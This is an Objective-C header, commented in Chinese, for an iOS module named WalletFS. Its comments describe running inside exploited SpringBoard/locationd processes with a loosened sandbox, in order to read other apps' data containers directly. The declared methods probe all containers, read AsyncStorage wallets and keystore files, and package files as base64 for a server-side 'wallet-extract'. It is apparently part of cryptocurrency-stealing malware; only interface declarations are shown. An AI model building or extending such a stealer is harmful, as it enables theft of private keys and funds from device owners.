//
//  WalletFS.h — 从 SpringBoard / locationd 直接读钱包 App 的容器
//
//  背景：给钱包单独注入要 135 秒（每个目标进程都要重跑一遍漏洞链）。
//  但我们的 photonote 已经能跨容器读 /var/mobile/Containers/Shared/AppGroup/，
//  说明宿主进程的沙箱是放宽过的。如果 Data 容器也能读，那钱包数据
//  根本不用注入 —— 直接在外面读文件即可，秒级。
//
#import <Foundation/Foundation.h>

@interface WalletFS : NSObject

/// 探测所有 App Data 容器，返回 [ {bundleId, path, readable, files:[...], error} ]
+ (NSArray<NSDictionary *> *)probeAllContainers;

/// 针对一个 bundleId 读它的 AsyncStorage（React Native 钱包用）
/// 返回 @{ @"dir":路径, @"keys":{key:value}, @"wallets":[...], @"error":... }
+ (NSDictionary *)asyncStorageOf:(NSString *)bundleId;

/// 读某个容器下相对路径的文件（用于 Documents/keystore 这类）
+ (NSData *)readFile:(NSString *)relPath inContainer:(NSString *)bundleId;

+ (NSString *)containerPathFor:(NSString *)bundleId;

/// 列出容器内某个相对目录下的文件名
+ (NSArray<NSString *> *)listFilesIn:(NSString *)relDir container:(NSString *)bundleId;

/**
 * 递归列出容器里的文件树（诊断用：确定某个钱包把数据放在哪）
 * @return @[ @"相对路径|大小", ... ]
 */
+ (NSArray<NSString *> *)treeOfContainer:(NSString *)bundleId
                                maxDepth:(NSInteger)maxDepth
                              maxEntries:(NSInteger)maxEntries;

/**
 * 按「采集项」收集一个 App 容器的文件，打成 path + base64 的包。
 * 条目名统一加 <bundleId>/ 前缀，服务端 wallet-extract 靠这个认钱包类型。
 * @return @{ @"files": @[@{@"p":...,@"d":base64}], @"bytes": @(N), @"error":... }
 */
+ (NSDictionary *)collectPackage:(NSString *)bundleId
                           paths:(NSArray<NSString *> *)relPaths
                           limit:(NSUInteger)maxBytes;

@end
